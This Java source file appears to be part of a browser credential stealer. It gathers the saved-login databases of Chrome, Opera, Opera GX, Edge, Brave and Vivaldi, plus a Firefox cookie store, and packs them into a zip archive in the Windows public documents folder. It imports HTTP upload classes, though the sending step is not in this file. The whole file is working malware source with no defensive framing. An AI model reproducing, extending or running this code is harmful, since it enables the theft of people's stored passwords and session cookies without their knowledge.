package io.github.luxotick.impl;

import io.github.luxotick.Sender;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;

import java.io.*;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.List;
import java.util.zip.*;


public class Zip {

    public static void main(String[] args) throws IOException {
        String chrome = System.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
        String opera = System.getenv("APPDATA") + "\\..\\Roaming\\Opera Software\\Opera Stable\\Login Data";
        String firefox = System.getenv("APPDATA") + "\\..\\Roaming\\Mozilla\\Firefox\\Profiles\\avionrhy.default-release\\storage\\default\\moz_cookies.sqlite";
        String operagx = System.getenv("APPDATA") + "\\..\\Roaming\\Opera Software\\Opera GX Stable\\Login Data";
        String edge = System.getenv("APPDATA") + "\\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data";
        String brave = System.getenv("APPDATA") + "\\..\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data";
        String vivaldi = System.getenv("APPDATA") + "\\..\\Local\\Vivaldi\\User Data\\Default\\Login Data";
        String logs = "C:\\Users\\Public\\Documents\\dothack.dev";


        final List<String> srcFiles = Arrays.asList(chrome, firefox, opera, operagx, edge, brave, vivaldi, logs);

        final FileOutputStream fos = new FileOutputStream("C:\\Users\\Public\\Documents\\logs.zip");
        ZipOutputStream zipOut = new ZipOutputStream(fos);

        for (String srcFile : srcFiles) {
            try {
                File fileToZip = new File(srcFile);
                FileInputStream fis = new FileInputStream(fileToZip);
                System.out.println(fileToZip.getPath());
                String path = fileToZip.getPath();

                String folderName;

                if (path.contains("Chrome")) {
                    folderName = "Chrome";
                    zipOut.putNextEntry(new ZipEntry(folderName + "/" + fileToZip.getName()));
                } else if (path.contains("Firefox")) {
                    folderName = "Firefox";
                    zipOut.putNextEntry(new ZipEntry(folderName + "/" + fileToZip.getName()));
                } else if (path.contains("Opera")) {
                    folderName = "Opera";
                    zipOut.putNextEntry(new ZipEntry(folderName + "/" + fileToZip.getName()));
                } else if (path.contains("OperaGX")) {
                    folderName = "OperaGX";
                    zipOut.putNextEntry(new ZipEntry(folderName + "/" + fileToZip.getName()));
                } else if (path.contains("Edge")) {
                    folderName = "MicrosoftEdge";
                    zipOut.putNextEntry(new ZipEntry(folderName + "/" + fileToZip.getName()));
                } else if (path.contains("Brave")) {
                    folderName = "Brave";
                    zipOut.putNextEntry(new ZipEntry(folderName + "/" + fileToZip.getName()));
                } else if (path.contains("Vivaldi")) {
                    folderName = "Vivaldi";
                    zipOut.putNextEntry(new ZipEntry(folderName + "/" + fileToZip.getName()));
                } else {
                    zipOut.putNextEntry(new ZipEntry(fileToZip.getName()));
                }

                byte[] bytes = new byte[1024];
                int length;
                while((length = fis.read(bytes)) >= 0) {
                    zipOut.write(bytes, 0, length);
                }
                fis.close();
            } catch (Exception e) {
                System.out.println("Error: " + e);
            }

        }
        zipOut.close();
        fos.close();
    }
}
